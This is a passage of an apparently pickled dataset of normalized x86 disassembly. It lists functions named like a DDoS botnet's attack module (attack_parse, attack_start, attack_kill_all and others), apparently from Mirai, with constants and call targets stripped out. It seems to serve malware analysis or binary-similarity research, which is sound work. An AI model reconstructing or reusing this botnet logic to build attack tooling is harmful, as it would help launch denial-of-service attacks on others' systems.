nADD~ESP,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~EDX,[ESP+0]\nMOV~[EAX+EDX-0],0\nMOV~[ESP+0],0\nJMP~FOO\nCMP~BYTEPTR[ESI+EBX],0\nJZ~FOO\nLEA~EAX,[EBX+0]\nMOV~[ESP+0],EAX\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nMOV~EBX,[ESP+0]\nADD~ESP,0\nCMP~EAX,EBX\nJG~FOO\nCMP~BYTEPTR[ESI+EBX],0\nJNZ~FOO\nMOV~[ESP+0],0\nCMP~[EDI+0],0\nJLE~FOO\nMOV~EAX,0\nSUB~ESP,0\nPUSH~EBX\nSHL~EAX,0\nMOV~ECX,[ESP+0]\nLEA~EAX,[EAX+ECX+0]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nMOV~EAX,[ESP+0]\nINC~EAX\nMOV~[ESP+0],EAX\nCMP~[EDI+0],EAX\nJLE~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~ESI\nMOV~EAX,[EDI+0]\nSHL~EAX,0\nMOV~EDX,[ESP+0]\nLEA~EAX,[EAX+EDX+0]\nPUSH~EAX\nCALL~FOO\nINC~[EDI+0]\nADD~ESP,0\nADD~[ESP+0],EBP\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~ECX,[ESP+0]\nLEA~EBX,[ESP+ECX+0]\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nCMP~[EDI+0],0\nJLE~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~[ESP+EAX+0],0\nSETZ~AL\nAND~EAX,0\nADD~EBX,EAX\nLEA~ESI,[ESP+EBX+0]\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~EDX,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EDX,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EDX-0],0\nLEA~EBX,[EDX+0]\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nMOV~[ESP+0],0\nCMP~[ESI+0],0\nJNZ~FOO\nMOV~[ESP+0],0\nMOV~EAX,[ESP+0]\nSUB~ESP,0\nMOV~EDX,EBX\nSUB~EDX,EAX\nPUSH~EDX\nLEA~EAX,[ESI+EAX]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~[ESP+0],0\nMOV~AL,[ESI]\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nMOV~ECX,ESI\nCMP~AL,0\nJZ~FOO\nJMP~FOO\nINC~EAX\nCMP~DL,0\nJNZ~FOO\nMOV~BYTEPTR[ECX],0\nJMP~FOO\nMOV~EAX,0\nMOV~[ESP+0],EAX\nLEA~ECX,[ESI+EAX]\nMOV~DL,[ECX]\nTEST~DL,DL\nJNZ~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nPUSH~ESI\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nMOV~EAX,ESI\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~EBX,[ESP+0]\nADD~EBX,0\nSUB~ESP,0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,ESI\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nMOV~EAX,ESI\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~BYTEPTR[ESI],0\nJNZ~FOO\nMOV~EBX,[ESP+0]\nADD~EBX,0\nSUB~ESP,0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,ESI\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nMOV~EAX,ESI\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nMOV~EAX,ESI\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nMOV~EAX,[ESP+0]\nMOV~[EAX-0],0\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nLEA~EBX,[ESP+0]\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nCMP~[ESP+EAX+0],0\nSETZ~AL\nAND~EAX,0\nADD~EBX,EAX\nLEA~ESI,[ESP+EBX+0]\nPUSH~0\nPUSH~0\nMOV~EAX,[ESP+0]\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~EBP,EAX\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nCMP~EAX,0\nJLE~FOO\nSUB~EBP,0\nLEA~EAX,[ESP+0]\nADD~EAX,EBX\nMOV~[EAX+EBP-0],0\nMOV~[ESP+0],0\nMOV~CL,[ESI]\nLEA~EAX,[ECX-0]\nMOV~EDX,ESI\nCMP~AL,0\nJA~FOO\nMOV~EDX,0\nINC~EDX\nMOV~[ESP+0],EDX\nMOV~CL,[EDX+ESI]\nLEA~EAX,[ECX-0]\nCMP~AL,0\nJBE~FOO\nLEA~EDX,[ESI+EDX]\nTEST~CL,CL\nJZ~FOO\nMOV~BYTEPTR[EDX],0\nMOV~EDX,[ESP+0]\nLEA~EAX,[EDX+0]\nMOV~[ESP+0],EAX\nCMP~BYTEPTR[ESI+EAX],0\nJNZ~FOO\nLEA~EAX,[EDX+0]\nMOV~[ESP+0],EAX\nSUB~ESP,0\nMOV~EAX,ESI\nADD~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nMOV~EAX,ESI\nADD~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nMOV~EAX,ESI\nADD~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nMOV~EAX,ESI\nADD~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~[ESP+0],EAX\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~BYTEPTR[ESI+EAX],0\nJNZ~FOO\nLEA~EBX,[EAX+0]\nMOV~[ESP+0],EBX\nLEA~EBX,[ESI+EBX]\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~[EBX+EAX-0],0\nJNZ~FOO\nMOV~EBX,ESI\nADD~EBX,[ESP+0]\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nMOV~[EBX+EAX-0],0\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nMOV~EDX,EAX\nLEA~EAX,[EAX-0]\nADD~ESP,0\nCMP~EAX,0\nJA~FOO\nMOV~EBX,[ESP+0]\nADD~EBX,EDX\nJMP~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nADD~ESP,0\nCMP~EBX,EAX\nJA~FOO\nMOV~EBX,ESI\nADD~EBX,[ESP+0]\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJNZ~FOO\nMOV~[ESP+0],0\nCMP~[EBX+0],0\nJNZ~FOO\nMOV~[ESP+0],0\nMOV~EDX,[ESP+0]\nSUB~ESP,0\nLEA~EAX,[EBP+0]\nSUB~EAX,EDX\nPUSH~EAX\nLEA~EDX,[EBX+EDX]\nPUSH~EDX\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],0\nMOV~AL,[EBX]\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nMOV~ECX,EBX\nCMP~AL,0\nJZ~FOO\nJMP~FOO\nINC~EAX\nCMP~DL,0\nJNZ~FOO\nMOV~BYTEPTR[ECX],0\nJMP~FOO\nMOV~EAX,0\nMOV~[ESP+0],EAX\nLEA~ECX,[EBX+EAX]\nMOV~DL,[ECX]\nTEST~DL,DL\nJNZ~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nPUSH~EBX\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nSUB~ESP,0\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~ESI,[ESP+0]\nADD~ESI,0\nSUB~ESP,0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~BYTEPTR[EBX],0\nJNZ~FOO\nSUB~ESP,0\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nMOV~ESI,[ESP+0]\nADD~ESI,0\nSUB~ESP,0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJLE~FOO\nSUB~ESP,0\nMOV~EAX,EBX\nADD~EAX,[ESP+0]\nINC~EAX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nMOV~EDX,[ESP+0]\nMOV~[EDX+0],0\nMOV~ECX,[ESP+0]\nMOV~[ECX-0],0\nJMP~FOO\nPUSH~0\nPUSH~0\nPUSH~[ESP+0]\nLEA~EAX,[ESP+0]\nPUSH~EAX\nCALL~FOO\nMOV~ESI,EAX\nMOV~EBX,[ESP+0]\nADD~EBX,0\nADD~ESP,0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nTEST~AL,AL\nJZ~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX-0],0\nJMP~FOO\nCMP~[ESP+0],ESI\nSETNLE~AL\nLEA~EAX,[EAX+EAX*8+0]\nMOV~ECX,[ESP+0]\nMOV~[ECX-0],AL\nPUSH~0\nPUSH~ESI\nLEA~EAX,[ESP+0]\nPUSH~EAX\nPUSH~[EDI-0]\nCALL~FOO\nADD~ESP,0\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nJMP~FOO\nMOV~DWORDPTR[EBX],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nCMP~[EDX-0],0\nJNZ~FOO\nCMP~[EDI+0],0\nJNZ~FOO\nMOV~EDX,[ESP+0]\nADD~EDX,0\nSUB~ESP,0\nPUSH~0\nMOV~EAX,[ESP+0]\nADD~EAX,0\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nSUB~[EDI+0],0\nADD~ESP,0\nCALL~FOO\nMOV~EBX,EAX\nMOV~DWORDPTR[EAX],0\nMOV~EDX,[EDI+0]\nMOV~ESI,[ESP+0]\nADD~ESI,0\nPUSH~0\nMOV~EAX,0\nSUB~EAX,EDX\nPUSH~EAX\nLEA~EDX,[ESI+EDX]\nPUSH~EDX\nPUSH~[EDI-0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJNZ~FOO\nMOV~DWORDPTR[EBX],0\nJMP~FOO\nCMP~EAX,0\nJNZ~FOO\nCMP~DWORDPTR[EBX],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[EDI-0]\nCALL~FOO\nMOV~[EDI-0],0\nMOV~ECX,[ESP+0]\nMOV~[ECX-0],0\nADD~ESP,0\nJMP~FOO\nADD~[EDI+0],EAX\nMOV~EAX,[ESP+0]\nMOV~[EDI-0],EAX\nMOV~EBP,[ESP+0]\nADD~EBP,0\nMOV~EAX,[EDI+0]\nTEST~EAX,EAX\nJLE~FOO\nMOV~EDX,[EDI+0]\nMOV~EBX,EAX\nCMP~EAX,EDX\nJLE~FOO\nMOV~EBX,EDX\nSUB~EAX,EBX\nMOV~[EDI+0],EAX\nCMP~DWORDPTR[EDI],0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~EAX\nPUSH~[EDI+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nPUSH~0\nPUSH~EAX\nPUSH~[EDI+0]\nPUSH~ESI\nCALL~FOO\nMOV~EBX,EAX\nLEA~EDX,[ESI+EAX]\nMOV~[ESP+0],EDX\nADD~ESP,0\nPUSH~0\nPUSH~0\nMOV~EAX,[EDI+0]\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~EDX\nCALL~FOO\nADD~EBX,EAX\nMOV~[ESP+0],EBX\nMOV~ECX,[ESP+0]\nMOV~[EBX+ECX+0],0\nADD~ESP,0\nCMP~[EDI+0],0\nJG~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nMOV~EAX,[EDI+0]\nSHL~EAX,0\nLEA~EAX,[EBP+EAX+0]\nPUSH~EAX\nCALL~FOO\nMOV~EBX,[EDI+0]\nSHL~EBX,0\nLEA~EBX,[EBP+EBX+0]\nMOV~[ESP],EBX\nCALL~FOO\nADD~ESP,0\nPUSH~0\nADD~EBX,EAX\nPUSH~EBX\nCALL~FOO\nMOV~EBX,[ESP+0]\nADD~EBX,0\nADD~ESI,EBX\nPUSH~0\nPUSH~0\nMOV~EAX,[EDI+0]\nSUB~EAX,EBX\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~EBX,[ESP+0]\nMOV~[EBX+EAX+0],0\nMOV~EBX,[EDI+0]\nSHL~EBX,0\nLEA~EBX,[EBP+EBX+0]\nADD~ESP,0\nPUSH~EBX\nCALL~FOO\nADD~ESP,0\nPUSH~ESI\nADD~EBX,EAX\nPUSH~EBX\nCALL~FOO\nINC~[EDI+0]\nADD~ESP,0\nMOV~[EDI+0],0\nMOV~EAX,[ESP+0]\nMOV~[EAX-0],0\nJMP~FOO\nMOV~EBX,0\nCMP~[EDI+0],0\nJNZ~FOO\nCMP~[EDI+0],0\nJNZ~FOO\nPUSH~0\nPUSH~0\nPUSH~[EDI+0]\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nPUSH~0\nPUSH~0\nPUSH~[EDI+0]\nPUSH~ESI\nCALL~FOO\nMOV~EBX,EAX\nMOV~EDX,[ESP+0]\nMOV~[EAX+EDX+0],0\nPUSH~0\nPUSH~0\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJZ~FOO\nPUSH~0\nPUSH~0\nPUSH~EBX\nPUSH~ESI\nCALL~FOO\nMOV~ECX,[ESP+0]\nMOV~[EAX+ECX+0],0\nADD~ESP,0\nSUB~ESP,0\nPUSH~0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nADD~EAX,0\nMOV~[EDI+0],EAX\nJMP~FOO\nMOV~EAX,[EDI+0]\nSUB~EAX,EBX\nMOV~[EDI+0],EAX\nTEST~EAX,EAX\nJZ~FOO\nTEST~EBX,EBX\nJZ~FOO\nMOV~EAX,[EDI+0]\nSUB~EAX,EBX\nMOV~[EDI+0],EAX\nSUB~ESP,0\nPUSH~EAX\nLEA~EAX,[ESI+EBX]\nPUSH~EAX\nPUSH~ESI\nCALL~FOO\nMOV~EAX,[EDI+0]\nMOV~EDX,[ESP+0]\nMOV~[EAX+EDX+0],0\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nJMP~FOO\nCMP~AL,0\nJNZ~FOO\nCALL~FOO\nMOV~EBX,EAX\nLEA~ESI,[ESP+0]\nMOV~DWORDPTR[EBX],0\nPUSH~0\nPUSH~0\nPUSH~ESI\nPUSH~[EDI-0]\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nCMP~EAX,0\nJNZ~FOO\nCMP~DWORDPTR[EBX],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[EDI-0]\nCALL~FOO\nMOV~[EDI-0],0\nMOV~ECX,[ESP+0]\nMOV~[ECX-0],0\nADD~ESP,0\nJMP~FOO\nMOV~EAX,[ESP+0]\nMOV~[EAX-0],0\nJMP~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX-0],0\nJMP~FOO\nMOV~ECX,[ESP+0]\nCMP~[ECX-0],0\nJZ~FOO\nMOV~[ECX-0],0\nINC~[ESP+0]\nADD~[ESP+0],0\nMOV~EAX,[ESP+0]\nCMP~[ESP+0],EAX\nJZ~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~ESI\nCALL~FOO\nADD~ESP,0\nCMP~EAX,0\nJG~FOO\nJMP~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p14
L7651L
tp15
a(S'attack_get_opt_str'
p16
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nMOV~AL,[ESP+0]\nMOV~[ESP+0],AL\nMOV~AL,[ESP+0]\nAND~EAX,0\nMOV~ESI,EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~AL,[ESP+0]\nCMP~AL,[EBX+0]\nJNZ~FOO\nJMP~FOO\nMOV~EBX,EDX\nMOV~AL,[EDX+0]\nADD~EDX,0\nCMP~AL,[ESP+0]\nJNZ~FOO\nMOV~EBX,[EBX]\nMOV~[ESP+0],EBX\nJMP~FOO\nLEA~EDX,[EBX+0]\nMOV~ECX,0\nINC~ECX\nCMP~ECX,ESI\nJNZ~FOO\nMOV~EAX,[ESP+0]\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p17
L88L
tp18
a(S'attack_get_opt_ip'
p19
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nRETN"'
p20
L67L
tp21
a(S'attack_get_opt_int'
p22
S'"PUSH~EBX\nSUB~ESP,0\nMOV~EBX,[ESP+0]\nPUSH~0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~EBX,EAX\nADD~ESP,0\nMOV~EAX,EBX\nADD~ESP,0\nPOP~EBX\nRETN"'
p23
L69L
tp24
a(S'attack_start'
p25
S'"PUSH~EBP\nMOV~EBP,ESP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~BL,[EBP+0]\nMOVZX~EDI,[EBP+0]\nMOVZX~ESI,[EBP+0]\nCALL~FOO\nCMP~EAX,0\nJZ~FOO\nTEST~EAX,EAX\nJG~FOO\nCALL~FOO\nCMP~EAX,0\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nTEST~EAX,EAX\nJZ~FOO\nMOV~EAX,0\nMOV~AL,<STR>\nMOV~[EBP-0],EAX\nTEST~EAX,EAX\nJLE~FOO\nMOV~ECX,<STR>\nMOV~EDX,[ECX]\nMOV~EAX,0\nCMP~BL,[EDX+0]\nJNZ~FOO\nJMP~FOO\nSUB~ESP,0\nPUSH~[EBP+0]\nCALL~FOO\nCALL~FOO\nADD~ESP,0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nMOV~DWORDPTR[ESP],0\nCALL~FOO\nMOV~EDX,[ECX+EAX*4]\nCMP~[EDX+0],BL\nJNZ~FOO\nPUSH~[EBP+0]\nMOV~EAX,ESI\nAND~EAX,0\nPUSH~EAX\nPUSH~[EBP+0]\nMOV~EAX,EDI\nAND~EAX,0\nPUSH~EAX\nCALL~DWORDPTR[EDX]\nADD~ESP,0\nJMP~FOO\nINC~EAX\nCMP~EAX,[EBP-0]\nJNZ~FOO\nSUB~ESP,0\nPUSH~0\nCALL~FOO\nLEA~ESP,[EBP-0]\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p26
L203L
tp27
a(S'attack_parse'
p28
S'"PUSH~EBP\nPUSH~EDI\nPUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nCMP~EBX,0\nJBE~FOO\nMOV~EAX,[ESI]\nROR~AX,0\nROR~EAX,0\nROR~AX,0\nMOV~[ESP+0],EAX\nCMP~EBX,0\nJZ~FOO\nMOV~AL,[ESI+0]\nMOV~[ESP+0],AL\nCMP~EBX,0\nJZ~FOO\nMOV~AL,[ESI+0]\nTEST~AL,AL\nJZ~FOO\nLEA~EDX,[EBX-0]\nMOV~[ESP+0],EDX\nAND~EAX,0\nMOV~EBP,EAX\nLEA~EAX,[EAX+EAX*4]\nMOV~[ESP+0],EAX\nCMP~EDX,EAX\nJB~FOO\nLEA~EDI,[ESI+0]\nSUB~ESP,0\nPUSH~0\nPUSH~EBP\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EBP\nADD~ESP,0\nCMP~[ESP+0],0\nJLE~FOO\nMOV~ECX,EAX\nMOV~EDX,[ESP+0]\nLEA~ESI,[ESI+EDX+0]\nMOV~EDX,[EDI]\nMOV~[ECX+0],EDX\nMOV~AL,[EDI+0]\nMOV~[ECX+0],AL\nADD~EDI,0\nMOV~WORDPTR[ECX],0\nMOV~[ECX+0],EDX\nADD~ECX,0\nCMP~EDI,ESI\nJNZ~FOO\nLEA~EAX,[EBP+EBP*4+0]\nSUB~EBX,EAX\nMOV~EAX,EBX\nSUB~EAX,0\nMOV~[ESP+0],EAX\nMOV~[ESP+0],0\nCMP~[ESP+0],0\nJZ~FOO\nMOV~BL,[EDI]\nMOV~[ESP+0],BL\nMOV~[ESP+0],0\nTEST~BL,BL\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nMOV~EBX,0\nMOV~BL,[ESP+0]\nPUSH~EBX\nCALL~FOO\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EAX\nMOV~[ESP+0],EBX\nADD~ESP,0\nTEST~EBX,EBX\nJLE~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~AL,[EDI+0]\nMOV~ESI,[ESP+0]\nMOV~[ESI+0],AL\nCMP~[ESP+0],0\nJZ~FOO\nMOV~BL,[EDI+0]\nMOV~EBP,[ESP+0]\nSUB~EBP,0\nMOV~AL,BL\nAND~EAX,0\nMOV~ESI,EAX\nCMP~EAX,EBP\nJG~FOO\nADD~EDI,0\nMOV~EDX,[ESP+0]\nMOV~[ESP+0],EDX\nMOV~[ESP+0],0\nJMP~FOO\nMOV~ECX,EBP\nSUB~ECX,ESI\nJZ~FOO\nMOV~EAX,0\nMOV~AL,BL\nLEA~EDX,[EAX+EDI]\nMOV~EBX,[ESP+0]\nMOV~ESI,[ESP+0]\nLEA~EBX,[ESI+EBX*8]\nMOV~[ESP+0],EBX\nMOV~AL,[EDX]\nMOV~ESI,[ESP+0]\nMOV~EBX,[ESP+0]\nMOV~[EBX+ESI*8+0],AL\nCMP~ECX,0\nJZ~FOO\nMOV~BL,[EDX+0]\nLEA~EBP,[ECX-0]\nMOV~AL,BL\nAND~EAX,0\nMOV~ESI,EAX\nCMP~EBP,EAX\nJL~FOO\nLEA~EDI,[EDX+0]\nSUB~ESP,0\nPUSH~0\nLEA~EAX,[ESI+0]\nPUSH~EAX\nCALL~FOO\nMOV~EDX,[ESP+0]\nMOV~[EDX],EAX\nADD~ESP,0\nPUSH~ESI\nPUSH~EDI\nPUSH~EAX\nCALL~FOO\nINC~[ESP+0]\nADD~ESP,0\nMOV~EAX,[ESP+0]\nCMP~[ESP+0],EAX\nJNZ~FOO\nCALL~FOO\nMOV~DWORDPTR[EAX],0\nSUB~ESP,0\nPUSH~[ESP+0]\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nPUSH~[ESP+0]\nMOV~EAX,0\nMOV~AL,[ESP+0]\nPUSH~EAX\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nCMP~[ESP+0],0\nJZ~FOO\nCMP~[ESP+0],0\nJZ~FOO\nMOV~ESI,0\nMOV~EAX,0\nMOV~AL,[ESP+0]\nLEA~EBX,[EAX+0]\nMOV~EDX,[ESP+0]\nMOV~EAX,[EDX+ESI*8-0]\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nINC~ESI\nCMP~ESI,EBX\nJNZ~FOO\nSUB~ESP,0\nPUSH~[ESP+0]\nCALL~FOO\nADD~ESP,0\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nPOP~EBP\nRETN"'
p29
L651L
tp30
a(S'attack_kill_all'
p31
S'"PUSH~ESI\nPUSH~EBX\nSUB~ESP,0\nMOV~EBX,0\nMOV~ESI,EBX\nMOV~EAX,<STR>\nTEST~EAX,EAX\nJZ~FOO\nSUB~ESP,0\nPUSH~0\nPUSH~EAX\nCALL~FOO\nADD~ESP,0\nMOV~<STR>,0\nINC~EBX\nCMP~EBX,0\nJNZ~FOO\nCALL~FOO\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nRETN"'
p32
L65L
tp33
a(S'add_attack'
p34
S'"PUSH~EDI\nPUSH~ESI\nPUSH~EBX\nMOV~ESI,EAX\nMOV~EDI,EDX\nSUB~ESP,0\nPUSH~0\nPUSH~0\nCALL~FOO\nMOV~EBX,EAX\nMOV~EAX,ESI\nMOV~[EBX+0],AL\nMOV~[EBX],EDI\nADD~ESP,0\nMOV~EAX,0\nMOV~AL,<STR>\nLEA~EAX,<STR>\nPUSH~EAX\nPUSH~<STR>\nCALL~FOO\nMOV~<STR>,EAX\nMOV~DL,<STR>\nMOV~ECX,0\nMOV~CL,DL\nMOV~[EAX+ECX*4],EBX\nINC~EDX\nMOV~<STR>,DL\nADD~ESP,0\nPOP~EBX\nPOP~ESI\nPOP~EDI\nRETN"'
p35
L95L
tp36
a(S'attack_init'
p37
